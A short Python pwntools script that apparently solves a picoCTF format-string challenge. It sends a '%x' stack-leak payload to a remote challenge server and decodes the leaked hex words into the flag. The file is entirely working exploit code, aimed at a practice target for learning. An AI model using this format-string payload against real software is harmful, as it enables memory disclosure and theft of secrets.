# import pwntools
from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 27912)

# get to vulnerability
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

# send string to print stack
r.send("%x" + "-%x"*30 + "\n")

# receive until the line we want i.e skip "Buying stonks with token:\n"
r.recvline()

# read in line
x = r.recvline()
# print(f"x is: {x}")
# x is: b'86f43d0-804b000-80489c3-f7eccd80-ffffffff-1-86f2160-f7eda110-
# f7eccdc7-0-86f3180-1-86f43b0-86f43d0-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-
# 5f79336e-34636462-61653532-ffea007d-f7f07af8-f7eda440-45cfc600-1-0-f7d69be9-f7edb0c0\n'

# remove unwanted components
# x = x[:-1] removes the \n in the end
# than decode from bytes to string
x = x[:-1].decode()

# parse to characters
for i in x.split('-'):
    if len(i) == 8:
        # the contents of the stack are in hexadecimal.
        a = bytearray.fromhex(i)

        # since this is a stack, the contents are reversed (in the bytes of 4).
        # plus you can just before reversing that it is reversed (by the picoCTF).
        for b in reversed(a):
            # we only want english characters
            if b > 32 and b < 128:
                s += chr(b)
            

# print string
print(s)